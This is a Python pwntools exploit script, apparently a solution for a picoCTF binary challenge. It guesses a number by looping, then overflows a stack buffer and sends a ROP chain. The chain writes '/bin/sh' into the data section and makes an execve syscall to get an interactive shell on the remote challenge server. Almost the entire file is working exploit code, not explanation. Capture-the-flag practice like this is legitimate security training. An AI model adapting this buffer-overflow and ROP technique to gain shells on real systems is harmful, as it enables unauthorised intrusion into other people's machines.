from pwn import *

local_bin = "./vuln"
elf = ELF(local_bin)
rop = ROP(elf)

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
print("POP_RDI = ", hex(POP_RDI))

POP_RAX = (rop.find_gadget(['pop rax', 'ret']))[0]
print("POP_RAX = ", hex(POP_RAX))

POP_RDX = (rop.find_gadget(['pop rdx', 'ret']))[0]
print("POP_RDX = ", hex(POP_RDX))

POP_RSI = (rop.find_gadget(['pop rsi', 'ret']))[0]
print("POP_RSI = ", hex(POP_RSI))

#p = process(local_bin)

p = remote("jupiter.challenges.picoctf.org" ,38467)
#p = gdb.debug(local_bin, '''
	#break main
	#break do_stuff
	#break *do_stuff+13
	#break *do_stuff+76
	#break win
	#continue
  	#''')


print("[+] Brute forcing number ")

#output = p.recvuntil()
#print(output)

while(True):
	output = p.recvuntil(b'\n')
	print(output)
	if (b'guess' in output):
		print("[-] Iteration 1")
		p.sendline(b'54')
		output = p.recvuntil(b'\n\n')
		print(output)
		if (b'win' in output):
			print("[+] Found correct number")
			break

print("######################### Triggering Win once ##########################")

buffer_size = 10
output = p.recvuntil(b"winner")
p.clean()
payload = b"A" * 0x78

'''
https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/

This whole rop chain is referenced from above link.
Setting the correct value for sysexe-cve 

syscall(RAX, RDI, RSI, RDX)

RAX = 0x3B
RDI = address pointing to /bin/sh (We just use any writable section in the binary)
RSI = 0
RDX = 0

'''
payload += p64(POP_RDX, endian='little')
payload += p64(0x6b7000, endian='little') #data section to store /bin/sh later on

payload += p64(POP_RAX, endian='little')
payload += b'/bin/sh\x00'

payload += p64(0x419127, endian='little')

payload += p64(POP_RDI, endian='little')
payload += p64(0x6b7000, endian='little') #data section to store /bin/sh later on

payload += p64(POP_RAX, endian='little')
payload += p64(0x3b, endian='little')

payload += p64(POP_RSI, endian='little')
payload += p64(0, endian='little')

payload += p64(POP_RDX, endian='little')
payload += p64(0, endian='little') #data section to store /bin/sh later on

payload += p64(0x040137c, endian='little') #syscall

#payload += p64(POP_RAX, endian='little')
#payload += p64(POP_RAX, endian='little')

#payload += b'BBBBBBBB'
p.sendline(payload)

#while(True):
	#sleep(1)

p.interactive()